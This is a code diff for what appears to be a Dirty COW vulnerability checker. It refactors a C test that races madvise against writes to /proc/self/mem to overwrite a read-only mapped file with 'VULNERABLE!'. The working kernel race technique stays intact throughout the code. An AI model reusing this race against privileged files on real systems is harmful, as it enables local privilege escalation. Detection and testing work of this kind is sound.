@@ -14,9 +14,12 @@
 #define DEBUG_ITER_PRINT_IVAL 10000000
 
 static const char *file_content = "VULNERABLE!" NL;
+
 struct thread_arguments {
-	void *map;
-	char *str;
+	bool cont;
+	const char * const path;
+	void * const map;
+	const char * const str;
 };
 
 static void *madvise_thread(void *arg) {
@@ -26,13 +29,15 @@ static void *madvise_thread(void *arg) {
 	void *map = args->map;
 
 	int i, c = 0;
-	for (i = 0; i < ITERATIONS; ++i) {
+	for (i = 0; args->cont && i < ITERATIONS; ++i) {
 		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
 			__DEBUG_PRINTF("madvise thread iteration %u" NL, i);
 		}
 
 		c += madvise(map, 100, MADV_DONTNEED);
 	}
+
+	args->cont = false;
 
 	__DEBUG_PRINTF("madvise %d" NL, c);
 	return NULL;
@@ -43,12 +48,12 @@ static void *memwrite_thread(void *arg) {
 
 	struct thread_arguments *args = (struct thread_arguments *)arg;
 	off_t map = (off_t)args->map;
-	char *str = args->str;
+	const char *str = args->str;
 	size_t len = strlen(str);
 
 	int i, c = 0, fd = open("/proc/self/mem", O_RDWR);
 
-	for (i = 0; i < ITERATIONS; ++i) {
+	for (i = 0; args->cont && i < ITERATIONS; ++i) {
 		if (0 == (i % DEBUG_ITER_PRINT_IVAL)) {
 			__DEBUG_PRINTF("memwrite thread iteration %u" NL, i);
 		}
@@ -56,6 +61,8 @@ static void *memwrite_thread(void *arg) {
 		(void)lseek(fd, map, SEEK_SET);
 		c += write(fd, str, len);
 	}
+
+	args->cont = false;
 
 	__DEBUG_PRINTF("memwrite %d" NL, c);
 	return NULL;
@@ -81,7 +88,12 @@ static int run_test() {
 	}
 	__DEBUG_PRINTF("mmap %p" NL, map);
 
-	struct thread_arguments args = { .map = map, .str = strdup(file_content) };
+	struct thread_arguments args = {
+		.cont = true,
+		.path = filepath,
+		.map = map,
+		.str = file_content
+	};
 
 	/* start threads */
 	pthread_t th_advise, th_write, th_poll;
